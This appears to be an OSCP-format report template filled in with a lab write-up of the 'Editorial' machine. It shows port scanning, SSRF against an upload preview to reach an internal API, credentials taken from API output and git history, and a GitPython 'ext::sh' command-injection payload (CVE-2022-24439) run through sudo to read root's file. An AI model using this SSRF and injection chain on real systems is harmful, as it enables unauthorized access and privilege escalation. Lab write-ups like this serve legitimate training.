OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![[Editorial image.png]]

Copyright © 2023 OffSec Ltd. All rights reserved.

No part of this publication, in whole or in part, may be reproduced, copied, transferred or any other right reserved to its copyright owner, including photocopying and all other copying, any transfer or transmission using any network or other means of communication, any broadcast for distant learning, in any form or by any means such as any information storage, transmission or retrieval system, without prior written permission from OffSec.

[1. OffSec OSCP Exam Penetration Test Report    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_gjdgxs)

[1.1 Introduction    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_30j0zll)

[1.2 Objective    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1fob9te)

[1.3 Requirements    3](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3znysh7)

[2. High-Level Summary    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2et92p0)

[2.1 Recommendations    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_tyjcwt)

[3. Methodologies    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3dy6vkm)

[3.1 Information Gathering    4](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1t3h5sf)

[3.2 Service Enumeration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4d34og8)

[3.3 Penetration    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2s8eyo1)

[3.4 Maintaining Access    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_17dp8vu)

[3.5 House Cleaning    5](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3rdcrjn)

[4. Independent Challenges    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_26in1rg)

[4.1 Target #1 –    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_lnxbz9)

[4.1.1 Service Enumeration    7](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_35nkun2)

[4.1.2 Initial Access –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ksv4uv)

[5. Active Directory Set    21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_44sinio)

[5.1 Ajla – 21](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2jxsxqh)

[5.1.1 Initial Access –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_z337ya)

[5.1.2 Privilege Escalation –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_3j2qqm3)

[5.1.3 Post-Exploitation    22](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1y810tw)

[5.2 Poultry –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_4i7ojhp)

[5.2.1 Initial Access –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2xcytpi)

[5.2.2 Post-Exploitation](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1ci93xb)

[5.3 DC –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_2bn6wsx)

[5.3.1 Initial Access –](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_qsh70q)

[5.3.2 Post-Exploitation](file:///C:%5CUsers%5Cuser%5CDesktop%5COSCP%5COSCP-Exam-Report.docx#_1pxezwc)

**1. OffSec OSCP Exam Penetration Test Report**

**1.1 Introduction**

The OffSec Lab and Exam penetration test report contains all efforts that were conducted in order to pass the OffSec course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.

**1.2 Objective**

The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.

**1.3 Requirements**

The student will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

**2. High-Level Summary**

John Doe was tasked with performing an internal penetration test towards OffSec Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate OffSec’s internal lab systems – the THINC.local domain. John’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to OffSec.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on OffSec’s network. When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, John had administrative level access to multiple systems. All systems were successfully exploited and access granted.

**2.1 Recommendations**

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

**3. Methodologies**

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the OffSec Labs and Exam environments are secure. Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

**3.1 Information Gathering**

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, John was tasked with exploiting the lab and exam network. The specific IP addresses were:

**Exam Network:10.10.11.20**

**3.2 Service Enumeration**

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed.

**3.3 Penetration**

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, John was able to successfully gain access to 10 out of the 50 systems.

**3.4 Maintaining Access**

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

**3.5 House Cleaning**

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on both the lab network and exam network were completed, John removed all user accounts and passwords as well as the Meterpreter services installed on the system. OffSec should not have to remove any user accounts or services from the system.

- **4. Independent Challenges**
- **4.1 Target #1 –  10.10.11.20**
- **4.1.1 Initial Access –**

**Severity:**

- **4.1.1 Service Enumeration**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.20 | **TCP**:22,80 |

We run nmap to scan the target and found a few ports open.

└─$ nmap -p- --min-rate=10000 10.10.11.20

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-28 06:11 JST

Warning: 10.10.11.20 giving up on port because retransmission cap hit (10).

Nmap scan report for 10.10.11.20

Host is up (0.19s latency).

Not shown: 65137 closed tcp ports (conn-refused), 396 filtered tcp ports (no-response)

PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.35 seconds

![[Editorial image 1.png]]

└─$ nmap -A -p22,80 10.10.11.20

![[Editorial image 2.png]]

└─$ echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts

![[Editorial image 3.png]]

└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://editorial.htb/FUZZ

![[Editorial image 4.png]]

about

upload

Browser Access

http://editorial.htb/

![[Editorial image 5.png]]

Wappalyzer

![[Editorial image 6.png]]

**4.1.2** **Initial Access – SSRF**

**BurpSuite****を起動し、**Previewを押下

![[Editorial image 7.png]]

![[Editorial image 8.png]]

![[Editorial image 9.png]]

**Send Repeater**

![[Editorial image 10.png]]

**Send**

![[Editorial image 11.png]]

**This is SSRF.**

![[Editorial image 12.png]]

/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg

Send to Intruder

![[Editorial image 13.png]]

Set Payload

![[Editorial image 14.png]]

**Set Payload**

https://github.com/HeckerBirb/top-nmap-ports-csv

![[Editorial image 15.png]]

**Start attack**

**画像を新しいタブで開く。**

![[Editorial image 16.png]]

**Download File**

![[Editorial image 17.png]]

└─$ file b79c3a93-4509-4756-8a34-821a6e8a3a2c

![[Editorial image 18.png]]

└─$ cat b79c3a93-4509-4756-8a34-821a6e8a3a2c |jq

/api/latest/metadata/messages/authors

![[Editorial image 19.png]]

![[Editorial image 20.png]]

└─$ file ad4bfa66-fe26-435a-b040-baa9520607f1

ad4bfa66-fe26-435a-b040-baa9520607f1: JSON text data

![[Editorial image 21.png]]

└─$ cat ad4bfa66-fe26-435a-b040-baa9520607f1 |jq

![[Editorial image 22.png]]

dev:dev080217_devAPI!@

└─$ ssh dev@10.10.11.20

![[Editorial image 23.png]]

![[Editorial image 24.png]]

**Local.txt value:**8fdefa069ed80e1885e63c34e531a05a

**4.1.3** **Privilege Escalation - git**

git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae | grep password

![[Editorial image 25.png]]

**prod:**080217_Producti0n_2023!@

sudo -l

![[Editorial image 26.png]]

prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py

#!/usr/bin/python3

import os

import sys

from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv\[1\]

r = Repo.init('', bare=True)

r.clone_from(url_to_clone, 'new_changes', multi_options=\["-c protocol.ext.allow=always"\])

**4.1.4** **Post Exploitation**

https://github.com/gitpython-developers/GitPython/issues/1515

**==🟢CVE-2022-24439:==** **==🟢\<gitpython::clone> 'ext::sh -c touch% /tmp/pwned'==**

prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'

![[Editorial image 27.png]]

![[Editorial image 28.png]]

**Proof.txt value:**3d701b05bf2906a30a6209b4cfa2f4af